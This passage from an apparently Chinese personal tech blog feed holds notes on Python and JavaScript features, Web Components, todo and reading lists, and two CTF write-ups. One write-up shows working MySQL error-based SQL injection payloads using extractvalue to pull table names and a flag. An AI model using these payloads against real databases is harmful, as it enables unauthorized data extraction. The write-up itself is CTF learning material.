      <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">getattr(os, <span class="string">"getcwd"</span>)()</div></pre></td></tr></table></figure>
<p>相当于<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">os.getcwd()</div></pre></td></tr></table></figure></p>
<p>好菜啊…我<br>这样子就可以不通过<code>.</code>来调用对象方法了</p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python-列表推导 js-数组推导]]></title>
      <url>/2017/05/30/python-%E5%88%97%E8%A1%A8%E6%8E%A8%E5%AF%BC-js-%E6%95%B0%E7%BB%84%E6%8E%A8%E5%AF%BC/</url>
      <content type="html"><![CDATA[<p>我的py学的菜爆了,哦,不是说我的js不菜,是都菜,我承认了,我现在都没认全py的类型</p>
<h2 id="python-列表推导"><a href="#python-列表推导" class="headerlink" title="python-列表推导"></a>python-列表推导</h2><p>不得不说py的REPL环境比node体验差很多啊,,,高亮没有,不全也没有,,,啊啊啊,<br>然后查了一下,据说,有一个<code>python-prompt-toolkit</code>的东西可以自己拿来构建一个REPL<br>链接 <a href="http://blog.just4fun.site/python-prompt-toolkit.html" target="_blank" rel="external">http://blog.just4fun.site/python-prompt-toolkit.html</a><br>我决定使用基于它它构建好的工具<br>阔怕,这个人的blog也推荐,不知道是不是他的blog,内容好多,真666</p>
<p>好了,前面说了一堆没用的,,,<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>res = [i * i <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]</div><div class="line"><span class="comment">#=&gt; [1, 4, 9]</span></div></pre></td></tr></table></figure></p>
<p>如果有条件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>res = [i * i <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="keyword">if</span> i &gt; <span class="number">1</span>]</div><div class="line"><span class="comment">#=&gt; [4, 9]</span></div></pre></td></tr></table></figure></p>
<h2 id="js-数组推导"><a href="#js-数组推导" class="headerlink" title="js-数组推导"></a>js-数组推导</h2><p>这个功能本来是准备ES6加入的,后来推到了ES7<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> raw = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</div><div class="line"><span class="keyword">var</span> res [<span class="keyword">for</span> (i <span class="keyword">of</span> raw) i * <span class="number">2</span>];</div></pre></td></tr></table></figure></p>
<p>但,我发现我的node怎么跑不了这个代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="keyword">var</span> raw = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</div><div class="line"><span class="literal">undefined</span></div><div class="line">&gt; <span class="keyword">var</span> res = [<span class="keyword">for</span> (i <span class="keyword">of</span> raw) i * <span class="number">2</span>];</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>你给我三个点点点什么意思….难道是现在还没办法用吗,翻车了<br>无奈的我到FF里跑了一下确实可以的</p>
<p>这个功能甚至可以替代ES5里的map和filter (ﾉ*･ω･)ﾉ</p>
<h4 id="数组推导"><a href="#数组推导" class="headerlink" title="数组推导"></a>数组推导</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="keyword">for</span> (i <span class="keyword">of</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) i * i]</div></pre></td></tr></table></figure>
<h4 id="ES5-map"><a href="#ES5-map" class="headerlink" title="ES5 map"></a>ES5 map</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(<span class="function"><span class="params">i</span> =&gt;</span> i * i)</div></pre></td></tr></table></figure>
<h4 id="Ramda"><a href="#Ramda" class="headerlink" title="Ramda"></a>Ramda</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> R = <span class="built_in">require</span>(<span class="string">'ramda'</span>);</div><div class="line">R.map(<span class="function"><span class="params">i</span> =&gt;</span> i * i, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p>或者让我科里化一次(傲娇状)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> R = <span class="built_in">require</span>(<span class="string">'ramda'</span>);</div><div class="line">square = R.map(<span class="function"><span class="params">i</span> =&gt;</span> i * i);</div><div class="line">square([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</div></pre></td></tr></table></figure></p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>实现filter的话,还需要使用if<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="keyword">for</span> (i <span class="keyword">of</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]) <span class="keyword">if</span>(i &lt; <span class="number">3</span>) i]</div></pre></td></tr></table></figure></p>
<p>好了,the end</p>
<blockquote>
<p>突然沮丧,又有什么用呢,你又不写前端,每天学这些,还想不想保研了</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> python js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ES5-数组方法]]></title>
      <url>/2017/05/30/ES5-%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[].forEach(function(value, index, array) &#123;</div><div class="line">    // ...</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[].map(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, array</span>) </span>&#123;</div><div class="line">    <span class="comment">// ...</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>一个栗子<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> squre = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, array</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> value * value;</div><div class="line">&#125;);</div><div class="line"><span class="comment">// 好像是[, index, array]不需要的话可以不写</span></div></pre></td></tr></table></figure></p>
<p>map相当于是一个增强版的forEach<br>map 可以对数组中每个元素调用函数,并且把函数的返回值收集起来,返回一个结果数组,没有返回值的就是undefined,而forEach只是执行callback,没有后面的功能</p>
<h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> newData = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].filter(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;<span class="keyword">return</span> item &lt; <span class="number">2</span>&#125;)</div><div class="line"><span class="comment">// =&gt; newData [0, 1]</span></div></pre></td></tr></table></figure>
<p><code>return true</code>的加到结果当中,<code>false</code>的话就被<code>filter</code>掉了</p>
<p>棒的是可以链式调用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> res = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line">    .map(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;<span class="keyword">return</span> item * item&#125;)</div><div class="line">    .filter(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;<span class="keyword">return</span> item &lt; <span class="number">10</span>&#125;)</div><div class="line"><span class="comment">// =&gt; [ 0, 1, 4, 9 ]</span></div></pre></td></tr></table></figure></p>
<p>如果是字符串的可以<code>return /reg/.test(item)</code>来filter咯</p>
<h2 id="some"><a href="#some" class="headerlink" title="some"></a>some</h2><p><code>some</code>的结果不会返回数组,会返回一个<code>true</code>or<code>false</code>,所以常丢到一个条件判断里<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> res = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>].some(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;<span class="built_in">console</span>.log(item); <span class="keyword">return</span> item &gt; <span class="number">2</span>&#125;)</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * 0</span></div><div class="line"><span class="comment"> * 1</span></div><div class="line"><span class="comment"> * 2</span></div><div class="line"><span class="comment"> * 3</span></div><div class="line"><span class="comment">*/</span></div><div class="line"><span class="comment">//=&gt; res true</span></div></pre></td></tr></table></figure></p>
<p>只要有函数返回<code>true</code>,那最后结果就是<code>true</code><br><code>some</code>而且只要跑到<code>true</code>的时候,就不会进行下去了,forEach这种的话都会跑完<br>所以这里结果只console.log出来 0 1 2 3, 没有4 5</p>
<h2 id="every"><a href="#every" class="headerlink" title="every"></a>every</h2><p>就是都满足啦<br>所以跑到第一个不满足的地方,下一个值就不会跑了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> res = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>].every(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;<span class="built_in">console</span>.log(item); <span class="keyword">return</span> item &gt; <span class="number">2</span>&#125;)</div><div class="line"><span class="comment">// =&gt; 0</span></div><div class="line"><span class="comment">// res false</span></div></pre></td></tr></table></figure></p>
<h2 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h2><p>要去吃饭打球了,抄别人一个栗子吧<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>].reduce(<span class="function"><span class="keyword">function</span>(<span class="params">pre,cur</span>)</span>&#123;<span class="keyword">return</span> pre + cur&#125;)</div><div class="line"><span class="comment">//=&gt; 10</span></div></pre></td></tr></table></figure></p>
<p>就是一种累积效应<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[].reduce(<span class="function"><span class="keyword">function</span>(<span class="params">previous, current, index, array</span>) </span>&#123;</div><div class="line">    <span class="comment">// ...</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>另外可以设置一个初始值<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array.reduce(callback[, initialValue])</div></pre></td></tr></table></figure></p>
<h2 id="reduceRight"><a href="#reduceRight" class="headerlink" title="reduceRight"></a>reduceRight</h2><p>就是从右边开始reduce</p>
]]></content>
      
        
        <tags>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ES6-解构赋值]]></title>
      <url>/2017/05/30/ES6-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</url>
      <content type="html"><![CDATA[<p>前几天和ZJM聊天,说到了这个解构赋值<br>又想到以前经常看到的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123;xxx&#125; = <span class="built_in">require</span>(<span class="string">'xxx'</span>);</div></pre></td></tr></table></figure></p>
<p>但没有注意啊,hhhh~还是好菜啊<br>今天准备写作业,然后偷偷上会儿网的时候看到了,记一下吧</p>
<h2 id="数组解构赋值"><a href="#数组解构赋值" class="headerlink" title="数组解构赋值"></a>数组解构赋值</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> [x, , z] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</div><div class="line"><span class="keyword">let</span> [head, ...tail] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]  <span class="comment">//这个酷炫吧,</span></div><div class="line"><span class="comment">// =&gt; head=1; tail=[2,3,4], 这个即使是tail只有一个元素也是数组,所以</span></div><div class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>]</div><div class="line"><span class="comment">// =&gt; a=1; b undefined; c []</span></div></pre></td></tr></table></figure>
<h2 id="对象解构赋值"><a href="#对象解构赋值" class="headerlink" title="对象解构赋值"></a>对象解构赋值</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> &#123;foo, bar&#125; = &#123;<span class="attr">bar</span>: <span class="string">'bar'</span>, <span class="attr">foo</span>: <span class="string">'foo'</span>&#125;</div></pre></td></tr></table></figure>
<p>如果变量名和属性名不一样<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> &#123;<span class="attr">foo</span>: baz&#125; = &#123;<span class="attr">foo</span>: <span class="string">'aaa'</span>, <span class="attr">bar</span>: <span class="string">'bbb'</span>&#125;</div><div class="line"><span class="comment">//=&gt; baz 'aaa'</span></div><div class="line"><span class="comment">//=&gt; foo not defined</span></div></pre></td></tr></table></figure></p>
<p>还有一个点,变量的<code>let</code>,<code>const</code>, 不能重复申明<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> old;</div><div class="line"><span class="keyword">let</span> &#123;old&#125; = &#123;<span class="attr">old</span>: <span class="string">'young'</span>&#125;</div></pre></td></tr></table></figure></p>
<h2 id="没有了"><a href="#没有了" class="headerlink" title="没有了"></a>没有了</h2><p>就是回想起来那天的<code>Ramda</code><br>其实我ES5里那些像是函数式的方法,,比如map啊之类的,掌握还欠缺<br>大部分时候其实用那个就可以了</p>
]]></content>
      
        
        <tags>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2017/05/29/todo-3/</url>
      <content type="html"><![CDATA[<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><p>看保研相关的东西,好烦人啊,我并不想看==我想学东西 […]<br>吃粽子 [√]<br>看哆啦A梦 [×]<br>写单片机作业 [×]<br>写网络安全作业 [×]<br>复习</p>
<ul>
<li>嵌入式</li>
<li>网络安全</li>
<li>单片机</li>
<li>数据挖掘<br>准备考六级<br>复习文化课<br>补ssctf,rctf,syc题目<br>打一场计算客?<br>计划总是那么丰满<br>bugku和南邮的CTF补题</li>
</ul>
<h2 id="书单"><a href="#书单" class="headerlink" title="书单"></a>书单</h2><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>代码审计 看过,重读<br>Web应用安全权威指南 看过,重读<br>黑客攻防技术宝典-浏览器实战篇</p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>程序员的自我修养<br>逆向工程权威指南 好厚,不知道有没有时间读<br>CSAPP<br>黑客免杀攻防<br>加密与解密<br>0day安全 搞不到纸质版</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[bkctf]]></title>
      <url>/2017/05/29/bkctf/</url>
      <content type="html"><![CDATA[<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p><a href="http://120.24.86.145:8004/index1.php?args=GLOBALS" target="_blank" rel="external">http://120.24.86.145:8004/index1.php?args=GLOBALS</a><br>吐血,这都要想好久,参考链接:<br><a href="http://php.net/manual/zh/reserved.variables.php" target="_blank" rel="external">http://php.net/manual/zh/reserved.variables.php</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql 报错注入]]></title>
      <url>/2017/05/28/mysql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h2 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h2><p><a href="http://54.223.247.98:8023/" target="_blank" rel="external">http://54.223.247.98:8023/</a><br>要通过post传递参数,不然过滤很严</p>
<p>##<br>尝试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=article` where id=1 and extractvalue(1, concat(0x7e, @@version,0x7e))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>XPATH syntax error: ‘~5.1.73~’</p>
</blockquote>
<p>可以这样子报错注入的还有updateXML</p>
<p>爆表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=article` where id=1 and extractvalue(1, concat(0x7e, substr((<span class="keyword">SeleCt</span> <span class="keyword">group_concat</span>(<span class="keyword">distinct</span> table_name ) <span class="keyword">from</span> information_schema.tables),<span class="number">384</span>)))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>XPATH syntax error: ‘~e,flag_is_here’</p>
</blockquote>
<p>跑出来表名是<code>flag_is_here</code></p>
<p>由于extractvalue只能显示32位<br>所以这个384是我用burp跑出来的,不知道正确的姿势是什么</p>
<p>但,,当我爆字段的时候发生了尴尬的事情,,因为不能用where好像是被x了<br>所以直接从<code>information_schema.columns</code>里面爆<code>column_name</code>的时候由于有1024的限制,所以没办法得到有用的东西,因为这个<code>column_name</code>内容太多了</p>
<blockquote>
<p>这个时候应该怎么办呢</p>
</blockquote>
<p>还好这道题目字段就是<code>flag</code><br>所以这样子就能拿到结果<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=article` where id=1 and extractvalue(1, concat(0x7e, (<span class="keyword">SeleCt</span> flag <span class="keyword">from</span> flag_is_here),<span class="number">0x7e</span>))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>XPATH syntax error: ‘~SYC{O0o._O0o._O0o._O0o._O0o.}~’</p>
</blockquote>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[几本值得推荐的书目]]></title>
      <url>/2017/05/26/%E5%87%A0%E6%9C%AC%E5%80%BC%E5%BE%97%E6%8E%A8%E8%8D%90%E7%9A%84%E4%B9%A6%E7%9B%AE/</url>
      <content type="html"><![CDATA[<p>关于burpsuite <a href="https://t0data.gitbooks.io/burpsuite/" target="_blank" rel="external">https://t0data.gitbooks.io/burpsuite/</a><br>Samba远程代码执行漏洞 <a href="https://hub.docker.com/r/medicean/vulapps/" target="_blank" rel="external">https://hub.docker.com/r/medicean/vulapps/</a><br>JS函数式 <a href="https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/" target="_blank" rel="external">https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[querySelector querySelectorAll]]></title>
      <url>/2017/05/26/querySelector-querySelectorAll/</url>
      <content type="html"><![CDATA[<p>关于这个我倒是没有很大疑问<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.querySelector(<span class="string">'.class'</span>)</div><div class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">'.class'</span>)</div></pre></td></tr></table></figure></p>
<p>但,我们有了这个,为什么还要用jQuery呢<br>是因为效率还是因为有什么问题吗</p>
<p>另外只选择id的话不要用这个…和<code>getElementById</code>还是有性能差异的<br>直接乖乖用<code>getElementById</code>就阔以了</p>
<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a href="http://www.cnblogs.com/Wayou/p/html5_web_api_queryselector.html" target="_blank" rel="external">http://www.cnblogs.com/Wayou/p/html5_web_api_queryselector.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelector" target="_blank" rel="external">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelector</a><br><a href="http://www.iteye.com/news/28503" target="_blank" rel="external">http://www.iteye.com/news/28503</a></p>
]]></content>
      
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Web Component]]></title>
      <url>/2017/05/26/Web-Component/</url>
      <content type="html"><![CDATA[<blockquote>
<p>好累啊..腿好酸</p>
</blockquote>
<p>看了一本书叫<code>Web Component实战</code></p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><code>Web Component</code>有几个模块:<br><code>模板元素</code>,<code>Shadow DOM</code>,<code>自定义元素</code>,<code>HTML Import</code></p>
<h2 id="模板元素"><a href="#模板元素" class="headerlink" title="模板元素"></a>模板元素</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">interface</span> <span class="title">HTMLTemplateElement</span>: <span class="title">HTMLELement</span> &#123;</div><div class="line">    <span class="keyword">readonly</span> arttribute DocumentFragment content;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>HTML Template元素的唯一一个元素content(类型为DocumentFragment)</p>
<p>检测是不是支持HTML Template<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Web Component: Template support<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"message"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">            <span class="keyword">var</span> isTemplateSupported = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">                <span class="keyword">var</span> template = <span class="built_in">document</span>.createElement(<span class="string">"template"</span>);</span></div><div class="line"><span class="javascript">                <span class="keyword">return</span> <span class="string">'content'</span> <span class="keyword">in</span> template;</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="javascript">            <span class="keyword">var</span> isSupported = isTemplateSupported(),</span></div><div class="line"><span class="javascript">                message = <span class="built_in">document</span>.getElementById(<span class="string">'message'</span>);</span></div><div class="line"><span class="javascript">            <span class="keyword">if</span>(isSupported) &#123;</span></div><div class="line"><span class="javascript">                message.innerHTML = <span class="string">"Supported"</span>;</span></div><div class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></div><div class="line"><span class="javascript">                message.innerHTML = <span class="string">"Not Supported"</span>;</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>模板是<em>延迟加载</em>的,要手动激活<br>方法有两种</p>
<h4 id="cloneNode"><a href="#cloneNode" class="headerlink" title="cloneNode"></a>cloneNode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;Node&gt; &lt;Target node&gt;.cloneNode(&lt;Boolean paramenter&gt;)</div></pre></td></tr></table></figure>
<p>参数: </p>
<pre><code>- true 深克隆 目标节点的子节点也被clone
- false 浅克隆
</code></pre><p>返回值:</p>
<pre><code>- &lt;Node&gt;
</code></pre><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"aTemplate"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></div><div class="line">        Template is activated using cloneNode.</div><div class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> aTemplate = <span class="built_in">document</span>.querySelector(<span class="string">'#aTemplate'</span>),</span></div><div class="line"><span class="javascript">    container = <span class="built_in">document</span>.getElementById(<span class="string">"container"</span>),</span></div><div class="line"><span class="undefined">    templateContent = aTemplate.content,</span></div><div class="line"><span class="javascript">    activeContent = templateContent.cloneNode(<span class="literal">true</span>); <span class="comment">//key</span></span></div><div class="line"><span class="undefined">    </span></div><div class="line"><span class="undefined">    container.appendChild(activeContent);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="importNode"><a href="#importNode" class="headerlink" title="importNode"></a>importNode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;Node&gt; document.importNode(&lt;target Node&gt;, &lt;Boolean parameter&gt;)</div></pre></td></tr></table></figure>
<p>这个更像是函数式的写法<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"aTemplate"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span></div><div class="line">        Template is activated using cloneNode.</div><div class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div 